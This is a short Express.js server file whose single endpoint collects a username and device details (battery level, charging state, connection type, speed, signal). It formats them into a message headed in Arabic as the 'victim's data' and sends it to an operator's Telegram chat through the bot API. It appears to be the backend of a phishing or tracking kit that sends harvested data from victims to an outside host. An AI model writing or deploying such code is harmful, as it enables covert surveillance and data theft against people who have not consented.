import express from 'express';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static('.'));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.post('/api/send-all-data', async (req, res) => {
  const { username, battery, charging, connectionType, speed, signal } = req.body;
  
  if (!username) {
    return res.status(400).json({ error: 'missing username' });
  }

  try {
    let message = `📱 بيانات الضحية:\n\n`;
    message += `👤 الاسم: ${username}\n`;
    message += `🔋 البطارية: ${battery || 'غير معروف'}%\n`;
    message += `⚡️ الشحن: ${charging || 'غير معروف'}\n`;
    message += `📶 نوع الاتصال: ${connectionType || 'غير معروف'}\n`;
    message += `⚡ السرعة: ${speed || 'غير معروف'}\n`;
    message += `📊 الإشارة: ${signal || 'غير معروف'}`;
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
    
    const result = await response.json();
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
